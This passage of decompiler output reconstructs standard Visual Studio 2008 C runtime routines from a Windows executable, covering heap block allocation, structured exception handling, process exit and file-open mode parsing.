      if (*(int *)(iVar3 + 4) == *(int *)(iVar3 + 8)) {
        cVar6 = *(char *)(uVar13 + 4 + uVar7);
        *(char *)(uVar13 + 4 + uVar7) = cVar6 + '\x01';
        if (uVar13 < 0x20) {
          if (cVar6 == '\0') {
            *param_1 = *param_1 | 0x80000000U >> ((byte)uVar13 & 0x1f);
          }
          puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
        }
        else {
          if (cVar6 == '\0') {
            param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar13 - 0x20 & 0x1f);
          }
          puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          uVar13 = uVar13 - 0x20;
        }
        *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar13 & 0x1f);
      }
      piVar4 = (int *)(param_2 + -4 + uVar12);
      *piVar4 = iVar9;
      *(int *)(iVar9 + -4 + (int)piVar4) = iVar9;
    }
    *(uint *)(param_2 + -4) = uVar12 + 1;
    *(uint *)(param_2 + -8 + uVar12) = uVar12 + 1;
  }
  else if ((int)uVar12 < iVar9) {
    param_3 = iVar9 - uVar12;
    *(uint *)(param_2 + -4) = uVar12 + 1;
    piVar4 = (int *)(param_2 + -4 + uVar12);
    uVar11 = (param_3 >> 4) - 1;
    piVar4[-1] = uVar12 + 1;
    if (0x3f < uVar11) {
      uVar11 = 0x3f;
    }
    if ((uVar13 & 1) == 0) {
      uVar12 = ((int)uVar13 >> 4) - 1;
      if (0x3f < uVar12) {
        uVar12 = 0x3f;
      }
      if (puVar8[1] == puVar8[2]) {
        if (uVar12 < 0x20) {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            *param_1 = *param_1 & uVar12;
          }
        }
        else {
          pcVar1 = (char *)(uVar12 + 4 + uVar7);
          uVar12 = ~(0x80000000U >> ((byte)uVar12 - 0x20 & 0x1f));
          puVar2 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
          *puVar2 = *puVar2 & uVar12;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            param_1[1] = param_1[1] & uVar12;
          }
        }
      }
      *(uint *)(puVar8[2] + 4) = puVar8[1];
      *(uint *)(puVar8[1] + 8) = puVar8[2];
      param_3 = param_3 + uVar13;
      uVar11 = (param_3 >> 4) - 1;
      if (0x3f < uVar11) {
        uVar11 = 0x3f;
      }
    }
    iVar5 = iVar5 + uVar11 * 8;
    iVar9 = *(int *)(iVar5 + 4);
    piVar4[2] = iVar5;
    piVar4[1] = iVar9;
    *(int **)(iVar5 + 4) = piVar4;
    *(int **)(piVar4[1] + 8) = piVar4;
    if (piVar4[1] == piVar4[2]) {
      cVar6 = *(char *)(uVar11 + 4 + uVar7);
      *(char *)(uVar11 + 4 + uVar7) = cVar6 + '\x01';
      if (uVar11 < 0x20) {
        if (cVar6 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> ((byte)uVar11 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0x44 + uVar10 * 4);
      }
      else {
        if (cVar6 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> ((byte)uVar11 - 0x20 & 0x1f);
        }
        puVar8 = (uint *)(uVar7 + 0xc4 + uVar10 * 4);
        uVar11 = uVar11 - 0x20;
      }
      *puVar8 = *puVar8 | 0x80000000U >> ((byte)uVar11 & 0x1f);
    }
    *piVar4 = param_3;
    *(int *)(param_3 + -4 + (int)piVar4) = param_3;
  }
  return 1;
}



// Library Function - Single Match
//  ___sbh_alloc_block
// 
// Library: Visual Studio 2008 Release

int * __cdecl ___sbh_alloc_block(uint *param_1)

{
  int *piVar1;
  char *pcVar2;
  int *piVar3;
  char cVar4;
  int *piVar5;
  byte bVar6;
  uint uVar7;
  int iVar8;
  uint *puVar9;
  int iVar10;
  uint uVar11;
  int *piVar12;
  uint *puVar13;
  uint *puVar14;
  uint uVar15;
  int iVar16;
  uint local_c;
  int local_8;
  
  puVar9 = DAT_0042e8c0 + DAT_0042e8bc * 5;
  uVar7 = (int)param_1 + 0x17U & 0xfffffff0;
  iVar8 = ((int)((int)param_1 + 0x17U) >> 4) + -1;
  bVar6 = (byte)iVar8;
  param_1 = DAT_0042e8c8;
  if (iVar8 < 0x20) {
    uVar15 = 0xffffffff >> (bVar6 & 0x1f);
    local_c = 0xffffffff;
  }
  else {
    uVar15 = 0;
    local_c = 0xffffffff >> (bVar6 - 0x20 & 0x1f);
  }
  for (; (param_1 < puVar9 && ((param_1[1] & local_c | *param_1 & uVar15) == 0));
      param_1 = param_1 + 5) {
  }
  puVar13 = DAT_0042e8c0;
  if (param_1 == puVar9) {
    for (; (puVar13 < DAT_0042e8c8 && ((puVar13[1] & local_c | *puVar13 & uVar15) == 0));
        puVar13 = puVar13 + 5) {
    }
    param_1 = puVar13;
    if (puVar13 == DAT_0042e8c8) {
      for (; (puVar13 < puVar9 && (puVar13[2] == 0)); puVar13 = puVar13 + 5) {
      }
      puVar14 = DAT_0042e8c0;
      param_1 = puVar13;
      if (puVar13 == puVar9) {
        for (; (puVar14 < DAT_0042e8c8 && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {
        }
        param_1 = puVar14;
        if ((puVar14 == DAT_0042e8c8) &&
           (param_1 = ___sbh_alloc_new_region(), param_1 == (uint *)0x0)) {
          return (int *)0x0;
        }
      }
      iVar8 = ___sbh_alloc_new_group((int)param_1);
      *(int *)param_1[4] = iVar8;
      if (*(int *)param_1[4] == -1) {
        return (int *)0x0;
      }
    }
  }
  piVar5 = (int *)param_1[4];
  local_8 = *piVar5;
  if ((local_8 == -1) || ((piVar5[local_8 + 0x31] & local_c | piVar5[local_8 + 0x11] & uVar15) == 0)
     ) {
    local_8 = 0;
    puVar9 = (uint *)(piVar5 + 0x11);
    uVar11 = piVar5[0x31];
    while ((uVar11 & local_c | *puVar9 & uVar15) == 0) {
      local_8 = local_8 + 1;
      puVar13 = puVar9 + 0x21;
      puVar9 = puVar9 + 1;
      uVar11 = *puVar13;
    }
  }
  piVar3 = piVar5 + local_8 * 0x81 + 0x51;
  iVar8 = 0;
  uVar15 = piVar5[local_8 + 0x11] & uVar15;
  if (uVar15 == 0) {
    uVar15 = piVar5[local_8 + 0x31] & local_c;
    iVar8 = 0x20;
  }
  for (; -1 < (int)uVar15; uVar15 = uVar15 * 2) {
    iVar8 = iVar8 + 1;
  }
  piVar12 = (int *)piVar3[iVar8 * 2 + 1];
  iVar10 = *piVar12 - uVar7;
  iVar16 = (iVar10 >> 4) + -1;
  if (0x3f < iVar16) {
    iVar16 = 0x3f;
  }
  DAT_0042e8c8 = param_1;
  if (iVar16 != iVar8) {
    if (piVar12[1] == piVar12[2]) {
      if (iVar8 < 0x20) {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 & 0x1f));
        piVar5[local_8 + 0x11] = uVar15 & piVar5[local_8 + 0x11];
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          *param_1 = *param_1 & uVar15;
        }
      }
      else {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 - 0x20 & 0x1f));
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] & uVar15;
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          param_1[1] = param_1[1] & uVar15;
        }
      }
    }
    *(int *)(piVar12[2] + 4) = piVar12[1];
    *(int *)(piVar12[1] + 8) = piVar12[2];
    if (iVar10 == 0) goto LAB_00413bf2;
    piVar1 = piVar3 + iVar16 * 2;
    iVar8 = piVar1[1];
    piVar12[2] = (int)piVar1;
    piVar12[1] = iVar8;
    piVar1[1] = (int)piVar12;
    *(int **)(piVar12[1] + 8) = piVar12;
    if (piVar12[1] == piVar12[2]) {
      cVar4 = *(char *)(iVar16 + 4 + (int)piVar5);
      *(char *)(iVar16 + 4 + (int)piVar5) = cVar4 + '\x01';
      bVar6 = (byte)iVar16;
      if (iVar16 < 0x20) {
        if (cVar4 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar6 & 0x1f);
        }
        piVar5[local_8 + 0x11] = piVar5[local_8 + 0x11] | 0x80000000U >> (bVar6 & 0x1f);
      }
      else {
        if (cVar4 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
        }
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
      }
    }
  }
  if (iVar10 != 0) {
    *piVar12 = iVar10;
    *(int *)(iVar10 + -4 + (int)piVar12) = iVar10;
  }
LAB_00413bf2:
  piVar12 = (int *)((int)piVar12 + iVar10);
  *piVar12 = uVar7 + 1;
  *(uint *)((int)piVar12 + (uVar7 - 4)) = uVar7 + 1;
  iVar8 = *piVar3;
  *piVar3 = iVar8 + 1;
  if (((iVar8 == 0) && (param_1 == DAT_0042be70)) && (local_8 == DAT_0042e8d0)) {
    DAT_0042be70 = (uint *)0x0;
  }
  *piVar5 = local_8;
  return piVar12 + 1;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4
// 
// Library: Visual Studio

void __cdecl __SEH_prolog4(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  int *unaff_FS_OFFSET;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_0042a044 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  *unaff_FS_OFFSET = (int)local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __SEH_epilog4
// 
// Library: Visual Studio

void __SEH_epilog4(void)

{
  undefined4 *unaff_EBP;
  undefined4 *unaff_FS_OFFSET;
  undefined4 unaff_retaddr;
  
  *unaff_FS_OFFSET = unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __except_handler4
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl __except_handler4(int *param_1,PVOID param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  BOOL BVar3;
  PVOID pvVar4;
  int *piVar5;
  int *local_1c;
  undefined4 local_18;
  PVOID *local_14;
  undefined4 local_10;
  PVOID local_c;
  char local_5;
  
  piVar5 = (int *)(*(uint *)((int)param_2 + 8) ^ DAT_0042a044);
  local_5 = '\0';
  local_10 = 1;
  iVar1 = (int)param_2 + 0x10;
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  pvVar4 = param_2;
  if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
    *(int ***)((int)param_2 + -4) = &local_1c;
    pvVar4 = *(PVOID *)((int)param_2 + 0xc);
    local_1c = param_1;
    local_18 = param_3;
    if (pvVar4 == (PVOID)0xfffffffe) {
      return local_10;
    }
    do {
      local_14 = (PVOID *)(piVar5 + (int)pvVar4 * 3 + 4);
      local_c = *local_14;
      if ((undefined *)piVar5[(int)pvVar4 * 3 + 5] != (undefined *)0x0) {
        iVar2 = __EH4_CallFilterFunc_8((undefined *)piVar5[(int)pvVar4 * 3 + 5]);
        local_5 = '\x01';
        if (iVar2 < 0) {
          local_10 = 0;
          goto LAB_00413d48;
        }
        if (0 < iVar2) {
          if (((*param_1 == -0x1f928c9d) &&
              (PTR____DestructExceptionObject_004286f0 != (undefined *)0x0)) &&
             (BVar3 = __IsNonwritableInCurrentImage((PBYTE)&PTR____DestructExceptionObject_004286f0)
             , BVar3 != 0)) {
            (*(code *)PTR____DestructExceptionObject_004286f0)(param_1,1);
          }
          __EH4_GlobalUnwind_4(param_2);
          if (*(PVOID *)((int)param_2 + 0xc) != pvVar4) {
            __EH4_LocalUnwind_16((int)param_2,(uint)pvVar4,iVar1,&DAT_0042a044);
          }
          *(PVOID *)((int)param_2 + 0xc) = local_c;
          if (*piVar5 != -2) {
            ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
          }
          ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
          __EH4_TransferToHandler_8((undefined *)local_14[2]);
          goto LAB_00413e0c;
        }
      }
      pvVar4 = local_c;
    } while (local_c != (PVOID)0xfffffffe);
    if (local_5 == '\0') {
      return local_10;
    }
  }
  else {
LAB_00413e0c:
    if (*(int *)((int)pvVar4 + 0xc) == -2) {
      return local_10;
    }
    __EH4_LocalUnwind_16((int)pvVar4,0xfffffffe,iVar1,&DAT_0042a044);
  }
LAB_00413d48:
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  return local_10;
}



// Library Function - Single Match
//  __heap_init
// 
// Library: Visual Studio 2008 Release

int __cdecl __heap_init(void)

{
  int in_stack_00000004;
  
  DAT_0042be74 = HeapCreate((uint)(in_stack_00000004 == 0),0x1000,0);
  if (DAT_0042be74 == (HANDLE)0x0) {
    return 0;
  }
  DAT_0042e8b8 = 1;
  return 1;
}



// Library Function - Single Match
//  __crt_waiting_on_module_handle
// 
// Library: Visual Studio 2008 Release

void __cdecl __crt_waiting_on_module_handle(LPCWSTR param_1)

{
  HMODULE pHVar1;
  DWORD dwMilliseconds;
  
  dwMilliseconds = 1000;
  do {
    Sleep(dwMilliseconds);
    pHVar1 = GetModuleHandleW(param_1);
    dwMilliseconds = dwMilliseconds + 1000;
    if (60000 < dwMilliseconds) {
      return;
    }
  } while (pHVar1 == (HMODULE)0x0);
  return;
}



// Library Function - Single Match
//  __amsg_exit
// 
// Library: Visual Studio 2008 Release

void __cdecl __amsg_exit(int param_1)

{
  code *pcVar1;
  
  __FF_MSGBANNER();
  __NMSG_WRITE(param_1);
  pcVar1 = (code *)__decode_pointer((int)PTR___exit_0042a30c);
  (*pcVar1)(0xff);
  return;
}



// Library Function - Single Match
//  ___crtCorExitProcess
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___crtCorExitProcess(int param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleW(u_mscoree_dll_00422360);
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_CorExitProcess_00422350);
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(param_1);
    }
  }
  return;
}



// Library Function - Single Match
//  ___crtExitProcess
// 
// Library: Visual Studio 2008 Release

void __cdecl ___crtExitProcess(int param_1)

{
  ___crtCorExitProcess(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



void FUN_00413ef8(void)

{
  __lock(8);
  return;
}



void FUN_00413f01(void)

{
  FUN_00413064(8);
  return;
}



// Library Function - Single Match
//  __initterm
// 
// Library: Visual Studio 2008 Release

void __cdecl __initterm(undefined **param_1)

{
  code **in_EAX;
  
  for (; in_EAX < param_1; in_EAX = in_EAX + 1) {
    if (*in_EAX != (code *)0x0) {
      (**in_EAX)();
    }
  }
  return;
}



// Library Function - Single Match
//  __initterm_e
// 
// Library: Visual Studio 2008 Release

void __cdecl __initterm_e(undefined **param_1,undefined **param_2)

{
  int iVar1;
  
  iVar1 = 0;
  while ((param_1 < param_2 && (iVar1 == 0))) {
    if ((code *)*param_1 != (code *)0x0) {
      iVar1 = (*(code *)*param_1)();
    }
    param_1 = (code **)param_1 + 1;
  }
  return;
}



// Library Function - Single Match
//  __cinit
// 
// Library: Visual Studio 2008 Release

int __cdecl __cinit(int param_1)

{
  BOOL BVar1;
  int iVar2;
  
  if (PTR___fpmath_004286a0 != (undefined *)0x0) {
    BVar1 = __IsNonwritableInCurrentImage((PBYTE)&PTR___fpmath_004286a0);
    if (BVar1 != 0) {
      (*(code *)PTR___fpmath_004286a0)(param_1);
    }
  }
  __initp_misc_cfltcvt_tab();
  iVar2 = __initterm_e((undefined **)&DAT_00422220,(undefined **)&DAT_00422238);
  if (iVar2 == 0) {
    _atexit((_func_4879 *)&LAB_004196af);
    __initterm((undefined **)&DAT_0042221c);
    if (DAT_0042e8b4 != (code *)0x0) {
      BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_0042e8b4);
      if (BVar1 != 0) {
        (*DAT_0042e8b4)(0,2,0);
      }
    }
    iVar2 = 0;
  }
  return iVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x004140ed)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _doexit
// 
// Library: Visual Studio 2008 Release

void __cdecl _doexit(int param_1,int param_2,int param_3)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  code *pcVar4;
  int *piVar5;
  int *piVar6;
  int *local_2c;
  int *local_24;
  int *local_20;
  
  __lock(8);
  if (DAT_0042bea8 != 1) {
    _DAT_0042bea4 = 1;
    DAT_0042bea0 = (undefined)param_3;
    if (param_2 == 0) {
      piVar1 = (int *)__decode_pointer(DAT_0042e8ac);
      if (piVar1 != (int *)0x0) {
        piVar2 = (int *)__decode_pointer(DAT_0042e8a8);
        local_2c = piVar1;
        local_24 = piVar2;
        local_20 = piVar1;
        while (piVar2 = piVar2 + -1, piVar1 <= piVar2) {
          iVar3 = __encoded_null();
          if (*piVar2 != iVar3) {
            if (piVar2 < piVar1) break;
            pcVar4 = (code *)__decode_pointer(*piVar2);
            iVar3 = __encoded_null();
            *piVar2 = iVar3;
            (*pcVar4)();
            piVar5 = (int *)__decode_pointer(DAT_0042e8ac);
            piVar6 = (int *)__decode_pointer(DAT_0042e8a8);
            if ((local_20 != piVar5) || (piVar1 = local_2c, local_24 != piVar6)) {
              piVar2 = piVar6;
              piVar1 = piVar5;
              local_2c = piVar5;
              local_24 = piVar6;
              local_20 = piVar5;
            }
          }
        }
      }
      __initterm((undefined **)&DAT_00422248);
    }
    __initterm((undefined **)&DAT_00422250);
  }
  FUN_004140e7();
  if (param_3 == 0) {
    DAT_0042bea8 = 1;
    FUN_00413064(8);
    ___crtExitProcess(param_1);
    return;
  }
  return;
}



void FUN_004140e7(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + 0x10) != 0) {
    FUN_00413064(8);
  }
  return;
}



// Library Function - Single Match
//  _exit
// 
// Library: Visual Studio 2008 Release

void __cdecl _exit(int _Code)

{
  _doexit(_Code,0,0);
  return;
}



// Library Function - Single Match
//  __exit
// 
// Library: Visual Studio 2008 Release

void __cdecl __exit(int param_1)

{
  _doexit(param_1,1,0);
  return;
}



// Library Function - Single Match
//  __cexit
// 
// Library: Visual Studio 2008 Release

void __cdecl __cexit(void)

{
  _doexit(0,0,1);
  return;
}



// Library Function - Single Match
//  __init_pointers
// 
// Library: Visual Studio 2008 Release

void __cdecl __init_pointers(void)

{
  undefined4 uVar1;
  
  uVar1 = __encoded_null();
  FUN_00412f3f(uVar1);
  FUN_00419a8b(uVar1);
  FUN_0041251a(uVar1);
  FUN_00419f24(uVar1);
  FUN_00419f15(uVar1);
  __initp_misc_winsig(uVar1);
  FUN_004191a8();
  __initp_eh_hooks();
  PTR___exit_0042a30c = (undefined *)__encode_pointer(0x414112);
  return;
}



// Library Function - Single Match
//  __NMSG_WRITE
// 
// Library: Visual Studio 2008 Release

void __cdecl __NMSG_WRITE(int param_1)

{
  char **ppcVar1;
  uint uVar2;
  int iVar3;
  errno_t eVar4;
  DWORD DVar5;
  size_t sVar6;
  HANDLE hFile;
  DWORD *lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  DWORD local_c;
  uint local_8;
  
  local_8 = 0;
  do {
    if (param_1 == (&DAT_0042a310)[local_8 * 2]) break;
    local_8 = local_8 + 1;
  } while (local_8 < 0x17);
  uVar2 = local_8;
  if (local_8 < 0x17) {
    iVar3 = __set_error_mode(3);
    if ((iVar3 != 1) && ((iVar3 = __set_error_mode(3), iVar3 != 0 || (DAT_0042a040 != 1)))) {
      if (param_1 == 0xfc) {
        return;
      }
      eVar4 = _strcpy_s(&DAT_0042beb0,0x314,s_Runtime_Error__Program__00422920);
      if (eVar4 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      DAT_0042bfcd = 0;
      DVar5 = GetModuleFileNameA((HMODULE)0x0,&DAT_0042bec9,0x104);
      if ((DVar5 == 0) &&
         (eVar4 = _strcpy_s(&DAT_0042bec9,0x2fb,s_<program_name_unknown>_00422908), eVar4 != 0)) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      sVar6 = _strlen(&DAT_0042bec9);
      if (0x3c < sVar6 + 1) {
        sVar6 = _strlen(&DAT_0042bec9);
        eVar4 = _strncpy_s((char *)(sVar6 + 0x42be8e),
                           (int)&DAT_0042c1c4 - (int)(char *)(sVar6 + 0x42be8e),&DAT_00422904,3);
        if (eVar4 != 0) {
                    // WARNING: Subroutine does not return
          __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        }
      }
      eVar4 = _strcat_s(&DAT_0042beb0,0x314,&DAT_00422900);
      if (eVar4 == 0) {
        eVar4 = _strcat_s(&DAT_0042beb0,0x314,*(char **)(local_8 * 8 + 0x42a314));
        if (eVar4 == 0) {
          ___crtMessageBoxA(&DAT_0042beb0,s_Microsoft_Visual_C___Runtime_Lib_004228d8,0x12010);
          return;
        }
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
                    // WARNING: Subroutine does not return
      __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    hFile = GetStdHandle(0xfffffff4);
    if ((hFile != (HANDLE)0x0) && (hFile != (HANDLE)0xffffffff)) {
      lpOverlapped = (LPOVERLAPPED)0x0;
      lpNumberOfBytesWritten = &local_c;
      ppcVar1 = (char **)(uVar2 * 8 + 0x42a314);
      sVar6 = _strlen(*ppcVar1);
      WriteFile(hFile,*ppcVar1,sVar6,lpNumberOfBytesWritten,lpOverlapped);
    }
  }
  return;
}



// Library Function - Single Match
//  __FF_MSGBANNER
// 
// Library: Visual Studio 2008 Release

void __cdecl __FF_MSGBANNER(void)

{
  int iVar1;
  
  iVar1 = __set_error_mode(3);
  if (iVar1 != 1) {
    iVar1 = __set_error_mode(3);
    if (iVar1 != 0) {
      return;
    }
    if (DAT_0042a040 != 1) {
      return;
    }
  }
  __NMSG_WRITE(0xfc);
  __NMSG_WRITE(0xff);
  return;
}



undefined ** FUN_00414378(void)

{
  return &PTR_DAT_0042a3c8;
}



// Library Function - Single Match
//  __lock_file
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock_file(FILE *_File)

{
  if ((_File < &PTR_DAT_0042a3c8) || ((FILE *)&DAT_0042a628 < _File)) {
    EnterCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  }
  else {
    __lock(((int)&_File[-0x2151f]._bufsiz >> 5) + 0x10);
    _File->_flag = _File->_flag | 0x8000;
  }
  return;
}



// Library Function - Single Match
//  __lock_file2
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    __lock(_Index + 0x10);
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) | 0x8000;
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// Library Function - Single Match
//  __unlock_file
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __unlock_file(FILE *_File)

{
  if (((FILE *)0x42a3c7 < _File) && (_File < (FILE *)0x42a629)) {
    _File->_flag = _File->_flag & 0xffff7fff;
    FUN_00413064(((int)&_File[-0x2151f]._bufsiz >> 5) + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  return;
}



// Library Function - Single Match
//  __unlock_file2
// 
// Library: Visual Studio 2008 Release

void __cdecl __unlock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) & 0xffff7fff;
    FUN_00413064(_Index + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wopenfile
// 
// Library: Visual Studio 2008 Release

FILE * __cdecl __wopenfile(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag,FILE *_File)

{
  bool bVar1;
  bool bVar2;
  bool bVar3;
  bool bVar4;
  wchar_t wVar5;
  int *piVar6;
  int iVar7;
  errno_t eVar8;
  uint _OpenFlag;
  wchar_t *pwVar9;
  wchar_t *pwVar10;
  uint local_8;
  
  bVar3 = false;
  bVar2 = false;
  bVar4 = false;
  for (pwVar10 = _Mode; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
  }
  wVar5 = *pwVar10;
  if (wVar5 == L'a') {
    _OpenFlag = 0x109;
LAB_0041459d:
    local_8 = DAT_0042c468 | 2;
  }
  else {
    if (wVar5 != L'r') {
      if (wVar5 != L'w') goto LAB_0041456a;
      _OpenFlag = 0x301;
      goto LAB_0041459d;
    }
    _OpenFlag = 0;
    local_8 = DAT_0042c468 | 1;
  }
  bVar1 = true;
  pwVar10 = pwVar10 + 1;
  wVar5 = *pwVar10;
  if (wVar5 != L'\0') {
    do {
      if (!bVar1) break;
      if ((ushort)wVar5 < 0x54) {
        if (wVar5 == L'S') {
          if (bVar2) goto LAB_004146cb;
          bVar2 = true;
          _OpenFlag = _OpenFlag | 0x20;
        }
        else if (wVar5 != L' ') {
          if (wVar5 == L'+') {
            if ((_OpenFlag & 2) != 0) goto LAB_004146cb;
            _OpenFlag = _OpenFlag & 0xfffffffe | 2;
            local_8 = local_8 & 0xfffffffc | 0x80;
          }
          else if (wVar5 == L',') {
            bVar4 = true;
LAB_004146cb:
            bVar1 = false;
          }
          else if (wVar5 == L'D') {
            if ((_OpenFlag & 0x40) != 0) goto LAB_004146cb;
            _OpenFlag = _OpenFlag | 0x40;
          }
          else if (wVar5 == L'N') {
            _OpenFlag = _OpenFlag | 0x80;
          }
          else {
            if (wVar5 != L'R') goto LAB_0041456a;
            if (bVar2) goto LAB_004146cb;
            bVar2 = true;
            _OpenFlag = _OpenFlag | 0x10;
          }
        }
      }
      else if (wVar5 == L'T') {
        if ((_OpenFlag & 0x1000) != 0) goto LAB_004146cb;
        _OpenFlag = _OpenFlag | 0x1000;
      }
      else if (wVar5 == L'b') {
        if ((_OpenFlag & 0xc000) != 0) goto LAB_004146cb;
        _OpenFlag = _OpenFlag | 0x8000;
      }
      else if (wVar5 == L'c') {
        if (bVar3) goto LAB_004146cb;
        local_8 = local_8 | 0x4000;
        bVar3 = true;
      }
      else if (wVar5 == L'n') {
        if (bVar3) goto LAB_004146cb;
        local_8 = local_8 & 0xffffbfff;
        bVar3 = true;
      }
      else {
        if (wVar5 != L't') goto LAB_0041456a;
        if ((_OpenFlag & 0xc000) != 0) goto LAB_004146cb;
        _OpenFlag = _OpenFlag | 0x4000;
      }
      pwVar10 = pwVar10 + 1;
      wVar5 = *pwVar10;
    } while (wVar5 != L'\0');
    if (bVar4) {
      for (; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
      }
      iVar7 = _wcsncmp((wchar_t *)&DAT_0042293c,pwVar10,3);
      if (iVar7 != 0) goto LAB_0041456a;
      for (pwVar10 = pwVar10 + 3; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
      }
      if (*pwVar10 != L'=') goto LAB_0041456a;
      do {
        pwVar9 = pwVar10;
        pwVar10 = pwVar9 + 1;
      } while (*pwVar10 == L' ');
      iVar7 = __wcsnicmp(pwVar10,u_UTF_8_00422944,5);
      if (iVar7 == 0) {
        pwVar10 = pwVar9 + 6;
        _OpenFlag = _OpenFlag | 0x40000;
      }
      else {
        iVar7 = __wcsnicmp(pwVar10,u_UTF_16LE_00422950,8);
        if (iVar7 == 0) {
          pwVar10 = pwVar9 + 9;
          _OpenFlag = _OpenFlag | 0x20000;
        }
        else {
          iVar7 = __wcsnicmp(pwVar10,u_UNICODE_00422964,7);
          if (iVar7 != 0) goto LAB_0041456a;
          pwVar10 = pwVar9 + 8;
          _OpenFlag = _OpenFlag | 0x10000;
        }
      }
    }
  }
  for (; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
  }
  if (*pwVar10 == L'\0') {
    eVar8 = __wsopen_s((int *)&_Mode,_Filename,_OpenFlag,_ShFlag,0x180);
    if (eVar8 != 0) {
